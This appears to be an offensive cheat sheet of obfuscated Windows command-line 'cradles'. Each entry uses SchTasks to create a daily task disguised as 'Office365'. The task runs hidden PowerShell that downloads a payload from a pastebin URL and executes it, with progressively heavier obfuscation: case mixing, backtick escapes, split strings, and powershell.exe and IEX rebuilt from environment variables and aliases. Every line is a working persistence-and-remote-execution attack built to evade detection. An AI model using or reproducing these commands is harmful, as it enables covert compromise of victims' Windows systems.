# Not proxy aware obfuscated Windows Command Shell Cradles, which can be used to create a taskschedule persistence to download a PowerShell payload
cmd> SchTasks /Create /SC DAILY /ST 12:00 /TN Office365 /TR "pOwErsHelL -w hidDEn -nOpR  -coM 'I`eX (N`E`W`-obje`CT Net.Webclient).\\\"dowNloa`DST`RIng\\\"((\\\"https://pastebin.com/raw/88SGrHVh\\\"))""
cmd> SchTasks /Create /SC DAILY /ST 12:00 /TN Office365 /TR "pOwErsHelL -w HidDEn -nOPr  -co 'i`Ex (N`E`W`-obje`CT Net.Webclient).\\\"dowNloa`DST`RIng\\\"((\\\"ht\\\"+\\\"tps://pastebin.com/raw/88SGrHVh\\\"))""


#Info: %APPDATA:~-13,1%%ALLUSERSPROFILE:~-9,-8%%OS:~-5,1%er%TMP:~7,1%he%TEMP:~-10,1%l = powershell.exe 
cmd> SchTasks /Create /SC DAILY /ST 12:00 /TN Office365 /TR "%APPDATA:~-13,1%%ALLUSERSPROFILE:~-9,-8%%OS:~-5,1%er%TMP:~7,1%he%TEMP:~-10,1%l -w HidDEn -nOPr  -co 'i`Ex (N`E`W`-obje`CT Net.Webclient).\\\"dowNloa`DST`RIng\\\"((\\\"ht\\\"+\\\"tps://pastebin.com/raw/88SGrHVh\\\"))""


#Info: %APPDATA:~-13,1%%ALLUSERSPROFILE:~-9,-8%%OS:~-5,1%er%TMP:~7,1%he%TEMP:~-10,1%l = powershell.exe 
#Info: &(GAL IE*) = Alias IEX
cmd> SchTasks /Create /SC DAILY /ST 12:00 /TN Office365 /TR "%APPDATA:~-13,1%%ALLUSERSPROFILE:~-9,-8%%OS:~-5,1%er%TMP:~7,1%he%TEMP:~-10,1%l -w HidDEn -nOPr  -co &(GAL IE*)((N`E`W`-obje`CT Net.Webclient).\\\"dowNloa`DST`RIng\\\"((\\\"ht\\\"+\\\"tps://pastebin.com/raw/88SGrHVh\\\")))""


#Info: %APPDATA:~-13,1%%ALLUSERSPROFILE:~-9,-8%%OS:~-5,1%er%TMP:~7,1%he%TEMP:~-10,1%l = powershell.exe 
#Info: &(GAL IE*) = Alias IEX
#Info: .(Get-Command N*ct) = New-Object
cmd> SchTasks /Create /SC DAILY /ST 12:00 /TN Office365 /TR "%APPDATA:~-13,1%%ALLUSERSPROFILE:~-9,-8%%OS:~-5,1%er%TMP:~7,1%he%TEMP:~-10,1%l -w HidDEn -nOPr  -co &(GAL IE*)((.(Get-Command N*ct)Net.WebClient).\\\"dowNloa`DST`RIng\\\"((\\\"ht\\\"+\\\"tps://pastebin.com/raw/88SGrHVh\\\")))""
